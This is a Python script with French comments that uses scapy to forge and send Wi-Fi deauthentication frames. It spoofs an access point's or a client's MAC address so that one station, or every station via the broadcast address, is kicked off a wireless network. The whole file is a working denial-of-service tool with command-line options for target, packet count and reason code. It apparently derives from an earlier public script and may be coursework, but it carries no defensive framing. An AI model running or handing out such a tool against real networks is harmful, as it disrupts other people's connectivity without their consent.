# python3
import argparse
from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Parsage des arguments
parser = argparse.ArgumentParser(prog="Deauth Attack Script",
                                 usage="deauth.py -i wlanmon0 -a 55:44:33:22:11:00 -t 00:11:22:33:44:55 -n 10 -r 3",
                                 description="Deauth script attack based on @catalyst256 script",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True, help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-a", "--AP", required=True, help="The BSSID of the Wireless Access Point you want to target")
parser.add_argument("-t", "--Target", required=True, help="The MAC address of the Target you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")
parser.add_argument("-n", "--Number", required=True, help="The number of deauth packets you want to send")
parser.add_argument("-r", "--Reason", required=True, help="The reason code of the deauth packet :\n" +
                    "1 - Unspecified\n"+
                    "4 - Disassociated due to inactivity\n"+
                    "5 - Disassociated because AP is unable to handle all currently associated stations\n"+
                    "8 - Desassociated because sending STA is leaving BSS")

args = parser.parse_args()

# Définition des "reason codes" disponibles
reasons = [1,4,5,8]
if int(args.Reason) not in reasons:
    print("Reasons availables are :\n"+
          "1 - Unspecified\n"+
          "4 - Disassociated due to inactivity\n"+
          "5 - Disassociated because AP is unable to handle all currently associated stations\n"+
          "8 - Desassociated because sending STA is leaving BSS")
    quit()

# Par défaut, on définit l'AP comme destinataire du pacquet et la STA comme émetteur
dest_addr = args.AP
src_addr = args.Target

# Si le reason code = 5 alors la trame doit être envoyée à la STA depuis dans l'AP. Pour tous les autres cas la trame peut être envoyée à l'AP avec l'adresse MAC source de la cible
if int(args.Reason) == 5 :
    dest_addr = args.Target
    src_addr = args.AP

# Consctruction de la trame
packet = RadioTap() / Dot11(type=0, subtype=12, addr1=dest_addr, addr2=src_addr, addr3=args.AP) / Dot11Deauth(
    reason=int(args.Reason))

# Envoie de la trame "Number" fois
for n in range(int(args.Number)):
    sendp(packet, iface=args.Interface)
    print(f"Deauth packets sent via: {args.Interface} with AP: {args.AP} and Target: {args.Target}")
